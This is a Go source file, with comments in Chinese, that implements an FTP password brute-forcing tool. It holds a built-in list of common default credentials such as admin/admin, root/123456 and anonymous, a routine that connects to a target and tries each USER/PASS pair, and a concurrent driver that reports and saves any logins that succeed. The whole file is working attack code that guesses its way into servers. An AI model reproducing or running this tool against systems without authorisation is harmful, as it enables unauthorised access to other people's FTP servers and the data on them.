package internal

import (
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

// FTP爆破字典 - 常见用户名密码组合
var ftpDictionary = []struct {
	username string
	password string
}{
	{"admin", "admin"},
	{"admin", "password"},
	{"admin", "123456"},
	{"root", "root"},
	{"root", "password"},
	{"root", "123456"},
	{"ftp", "ftp"},
	{"ftp", "password"},
	{"user", "user"},
	{"user", "password"},
	{"test", "test"},
	{"guest", "guest"},
	{"anonymous", ""},
}

// FTP连接测试
func testFTPLogin(host string, port int, username, password string, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), timeout)
	if err != nil {
		return false
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(timeout))

	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil || !strings.HasPrefix(string(buf[:n]), "220") {
		return false
	}

	// 发送用户名
	conn.Write([]byte(fmt.Sprintf("USER %s\r\n", username)))
	n, err = conn.Read(buf)
	if err != nil || !strings.HasPrefix(string(buf[:n]), "331") {
		return false
	}

	// 发送密码
	conn.Write([]byte(fmt.Sprintf("PASS %s\r\n", password)))
	n, err = conn.Read(buf)
	if err != nil || !strings.HasPrefix(string(buf[:n]), "230") {
		return false
	}

	return true
}

// FTP爆破
func FTPBruteForce(host string, port int, timeout time.Duration, resultWriter *os.File) {
	var wg sync.WaitGroup
	successChan := make(chan string)

	// 结果收集器
	go func() {
		for result := range successChan {
			fmt.Print(result)
			if resultWriter != nil {
				resultWriter.WriteString(result)
			}
		}
	}()

	// 进度显示
	total := len(ftpDictionary)
	progress := make(chan int, total)
	go func() {
		tried := 0
		for range progress {
			tried++
			fmt.Printf("\rTrying %d/%d (%.1f%%)", tried, total, float64(tried)/float64(total)*100)
		}
		fmt.Println()
	}()

	// 并发尝试
	for _, cred := range ftpDictionary {
		wg.Add(1)
		go func(username, password string) {
			defer wg.Done()
			if testFTPLogin(host, port, username, password, timeout) {
				successChan <- fmt.Sprintf("[+] Success: %s:%s@%s\n", username, password, host)
			}
			progress <- 1
		}(cred.username, cred.password)
	}

	wg.Wait()
	close(successChan)
	close(progress)
}
